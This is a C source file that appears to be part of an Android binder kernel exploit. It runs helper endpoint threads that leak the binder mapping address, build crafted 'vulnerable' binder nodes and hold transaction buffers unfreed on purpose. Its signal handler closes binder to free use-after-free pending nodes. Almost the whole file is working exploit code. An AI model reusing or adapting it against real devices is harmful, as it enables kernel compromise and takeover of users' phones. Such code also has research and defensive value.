#include <sched.h>
#include <stdio.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <poll.h>
#include <sys/epoll.h>
#include <errno.h>
#include <setjmp.h>

#include "binder.h"
#include "handle.h"
#include "log.h"
#include "endpoint.h"
#include "pending_node.h"


static struct endpoint_handle *endpoints = NULL;

static int endpoint_transaction_handler(struct endpoint_handle *handle, struct binder_transaction_data *tr, struct binder_io *msg, struct binder_io *reply)
{

	int res = 1;
	struct binder_state *bs = handle->bs;
	pthread_t th;

	switch (tr->code) {
		case GET_VMA_START:
			/* Do it in 2 times. */
			bio_put_uint32(reply, (uint32_t)bs->mapped);
			bio_put_uint32(reply, (uint32_t)(((uint64_t)(bs->mapped)>>32)));
			res = 0;
			break;
		case EXCHANGE_HANDLES:
			handle->client_handle = bio_get_ref(msg);
			/* Acquire the handle. */
			binder_acquire(bs, handle->client_handle);

			/* Create the vulnerable node in the process. */
			bio_put_obj(reply, bs->mapped + 0xe8);
			uint64_t node2 = bs->mapped + 0xe8;
			node2 = node2 & 0xFFFFFFFF;
			node2 = node2 << 32;
			node2 += 0x42;

			bio_put_obj(reply, node2);
			res = 0;
			break;
		case ADD_PENDING_NODE:
			add_pending_node(bs, handle->client_handle);
			//uaf_node_th = add_pending_node(bs, client_handle);
			//log_info("uaf_node_th: %p\n", uaf_node_th);
			res = 0;
			break;
		case TERMINATE_PENDING_NODE:
			th = bio_get_uint32(msg) + (((uint64_t)bio_get_uint32(msg)) << 32);
			terminate_pending_node(th);
			res = 0;
			break;
		case RESERVE_BUFFER:
			if (handle->reserved_buffer) {
				log_err("A buffer is already reserved. Free it if you want to reserve another one.\n");
				res = -1;
				break;
			}
			else {
				handle->reserved_buffer = tr->data.ptr.buffer;
				res = 42; /* Instruct the calling function to skip freeing the buffer. */
			}
			break;
		case FREE_RESERVED_BUFFER:
			if (handle->reserved_buffer) {
				binder_free_buffer(bs, handle->reserved_buffer);
				handle->reserved_buffer = 0;
			}
			res = 0;
			break;
		case TRIGGER_DECREF:
			res = 0;
			break;
		default:
			log_err("[-] Unknown transaction code.\n");
			break;
	}


	return res;

}

static struct endpoint_handle *_lookup_by_name(const char *name)
{
	struct endpoint_handle *handle = endpoints;

	while (handle) {
		if (!strcmp(name, handle->name))
				return handle;
		handle = handle->next;
	}

	return NULL;
}

static struct endpoint_handle *_lookup_by_pid(pid_t pid)
{
	struct endpoint_handle *handle = endpoints;

	while (handle) {
		if (handle->pid == pid)
			return handle;
		handle = handle->next;
	}

	return NULL;
}


void plop(void)
{
	struct endpoint_handle *handle = NULL;

	/* Setup jmpbufs. */
	handle = _lookup_by_pid(syscall(__NR_gettid));

	/* Close binder to release the UAFed pending node.
	 * This is the only way to actually free them without entered
	 * the binder_transaction_buffer_release() function.
	 */
	binder_close(handle->bs);
	handle->status = 0;

	/* longjmp. */
	longjmp(handle->env, 0);

}


/*
 * The binder endpoint thread. 
 */
static void *endpoint_thread(void *args)
{
	uint8_t data[128];
	uint32_t remaining = 0;
	uint32_t consumed = 0;
	struct endpoint_handle *handle = (struct endpoint_handle *)args;


	setjmp(handle->env);

	signal(SIGTERM, plop);

	handle->bs = binder_open(BINDER_DEVICE, 128 * 1024);
	if (!handle->bs) {
		log_err("[-] Failed to open binder device.\n");
		goto error;
	}

	/* Publish our endpoint name using the fake system server of our APK. */
	if (!publish_handle(handle->bs, 0x42, handle->name)) {
		log_err("[-] Failed to publish handle\n");
		goto error;
	}

	/* Enter looper. */
	uint32_t looper = BC_ENTER_LOOPER;
	binder_write(handle->bs, &looper, sizeof(looper));

	/* Everything's fine. */
	handle->status = 1;
	pthread_barrier_wait(&handle->barrier);

	/* We do this "manually" and don't rely to much on the binder api because
	 * we do some weird things.
	 */
	uint32_t cmd;
	struct binder_transaction_data *tr;


	while ((cmd = binder_read_next(handle->bs, data, &remaining, &consumed))) {
		switch (cmd) {
			case BR_DECREFS:
				break;
			case BR_TRANSACTION: {
				uint8_t rdata[256];
				struct binder_io msg;
				struct binder_io reply;
				int res;

				tr = (struct binder_transaction_data *)(data + consumed - sizeof(*tr));
				bio_init(&reply, rdata, sizeof(rdata), 4);
				bio_init_from_txn(&msg, tr);
				res = endpoint_transaction_handler(handle, tr, &msg, &reply);
				if (tr->flags & TF_ONE_WAY) {
					if (res == 42)
						continue;
					binder_free_buffer(handle->bs, tr->data.ptr.buffer);
				} else {
					if (res == 42)
						/* we reply, but skip freing the buffer. */
						binder_send_reply(handle->bs, &reply, NULL, 0);
					else
						binder_send_reply(handle->bs, &reply, tr->data.ptr.buffer, 0);
				}	
				break;
		        }
			default:
				break;
		}
	}


	exit(0);
error:
	handle->status = -1;
	pthread_barrier_wait(&handle->barrier);
	exit(0);
}



void endpoint_reset(const char *endpoint_name)
{
	struct endpoint_handle *handle = NULL;

	/* Double check that the name doesn't already exists. */
	if ((handle = _lookup_by_name(endpoint_name)) == NULL) {
		log_err("[-] An endpoint already exists with that name\n");
		return;
	}

   /* Reset the endpoint. */
	kill(handle->pid, SIGTERM);

	/* Wait on barrier. */
	pthread_barrier_wait(&handle->barrier);
}

static void endpoint_handle_free(struct endpoint_handle *handle)
{
	struct endpoint_handle *tmp = endpoints;


	/* Start by removing from linked list. */
	if (handle == endpoints) {
		endpoints = handle->next;
	} else {
		while (tmp->next != handle)
			tmp = tmp->next;
		/* Remove */
		tmp->next = handle->next;
	}

	free(handle->name);
	free(handle->stack);
	binder_close(handle->bs);
	free(handle);
}

/*
 * Bootstrap the binder endpoint.
 */
bool bootstrap_endpoint(const char *endpoint_name)
{
	struct endpoint_handle *handle = NULL;


	/* Double check that the name doesn't already exists. */
	if (_lookup_by_name(endpoint_name) != NULL) {
		log_err("[-] An endpoint already exists with that name\n");
		return false;
	}

	/* Allocate handle. */
	handle = malloc(sizeof(*handle));
	if (handle == -1) {
		log_err("[-] Unable to allocate endpoint handle. Reason: '%s'\n", strerror(errno));
		return false;
	}

	memset(handle, 0, sizeof(*handle));

	if (pthread_barrier_init(&handle->barrier, NULL, 2)) {
		perror("pthread_barrier_init");
		return false;
	}

	handle->next = NULL;
	handle->stack = malloc(65536);
	handle->name = strdup(endpoint_name);
	handle->status = 0;
	handle->pid = clone(endpoint_thread, handle->stack + 65536, CLONE_VM|SIGCHLD, handle);


	/* Wait on the barrier for the endpoint creation to be complete. */
	pthread_barrier_wait(&handle->barrier);

	if (handle->status < 0) {
		int status;
		waitpid(handle->pid, &status, NULL);
		endpoint_handle_free(handle);
		return false;
	}

	/* Insert the endpoint in the linked list. */
	if (!endpoints)
		endpoints = handle;
	else {
		struct endpoint_handle *tmp = endpoints;
		while (tmp->next != NULL)
			tmp = tmp->next;
		/* Insert. */
		tmp->next = handle;
	}

	return true;
}

bool terminate_endpoint(const char *endpoint_name)
{
	struct endpoint_handle *handle = _lookup_by_name(endpoint_name);
	int status;

	if (!handle) {
		log_err("[-] No endpoint named: '%s'\n", endpoint_name);
		exit(1);
		return false;
	}
	kill(handle->pid, SIGKILL);
	waitpid(handle->pid, &status, 0);

	endpoint_handle_free(handle);

	return true;
}

struct endpoint_handle *get_endpoints()
{
   return endpoints;
}

